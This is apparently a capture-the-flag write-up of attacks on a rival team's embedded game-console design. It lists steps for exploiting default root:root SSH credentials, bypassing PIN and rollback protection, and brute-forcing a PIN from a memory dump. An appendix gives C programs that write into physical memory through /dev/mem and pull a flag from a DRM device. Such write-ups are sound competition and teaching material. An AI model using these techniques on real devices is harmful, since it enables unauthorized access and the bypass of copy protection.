# Attacks
Their key weakness was that they left the ssh server with default credentials `root:root` - we exploit it for maximum damage!

`jailbreak`: Upload jailbreak program using SCP and run 

`ip`: Run the ip game, scp out the game into IDA and reverse to get the flag.

`hackermod`: Run the hackermod game, scp out the game and reverse the `flag_printout` function. Write a program that dumps the correct regions in memory and XORs them according to the flag_printout and run on the ArtyZ7. 

`pin_bypass`: Upload encrypted game to filesystem. Write the encrypted game to memory as expected by `mesh-game-loader`. Run mesh-game-loader. Enable +x permissions. Win.

`rollback`:Upload encrypted game to filesystem. Write the encrypted game to memory as expected by `mesh-game-loader`. Run mesh-game-loader. Enable +x permissions. Win

`pin_extraction`: Extract `/dev/mem` onto the SD card. Extract public key (which are null-terminated hex-strings), salt, nonce. Bruteforce corresponding PIN using `verifyPinFE` in `encryptPin.c`.


# Appendix
## `write_to_memory.c`
```
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/mman.h>

// this is the path where the game will be written to
#define GAMEPATH "/usr/bin/game"
//
// // this is the linux device representing the Zynq ram
#define MEMPATH "/dev/mem"
//
// // the reserved address in ram where uboot writes the game to
#define BASE_ADDR 0x1fc00000
//
// // the size of the reserved memory in ram where uboot writes the game to
#define MAPSIZE 0x400000
#define MAPSIZE 0x400000

int main(int argc, char **argv)
{
    int fd;
    unsigned char *map;
    unsigned char *map_tmp;
    int gameSize;
    FILE * gameFp;
    int written;

    // open the memory device
    fd = open(MEMPATH, O_RDWR | O_SYNC);

    if (fd == -1) {
        printf("mem open failed\r\n");
        return 1;
    }

    // map the memory device so your can access it like a chunk of memory
    map = mmap(0, MAPSIZE, (PROT_READ | PROT_WRITE), MAP_SHARED, fd, BASE_ADDR);

    gameFp = NULL;

    gameFp = fopen(GAMEPATH, "w+b");

    if (gameFp == NULL) {
        printf("Error opening game file\r\n");
        return 1;
    }
    unsigned int gameSz;
    FILE *encFp;

    struct stat st;
    stat(argv[1], &st);
    gameSz = st.st_size;

    char *game = (char *) malloc(1*gameSz);

    encFp = fopen(argv[1], "rb");
    fread(game, 1, gameSz, encFp);
    *(int *)map = gameSz;

    map += 0x40;
    memcpy(map, game, gameSz);
    return 0;
}
```
## `extract_mesh.c`
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

int main()
{
    int fd;
    void *c;
    unsigned int a, b;

    fd = open("/dev/mesh_drm", 2);
    c = mmap(0, 4096, 3, 1, fd, 0);
    a = *(unsigned int *)(c + 24);
    b = *(unsigned int *)(c + 28);
    printf("ectf{%s%08x%08x}\r\n", "hackermod_", a ^ 0x4db12884, b ^ 0x19fcace6);
}
```
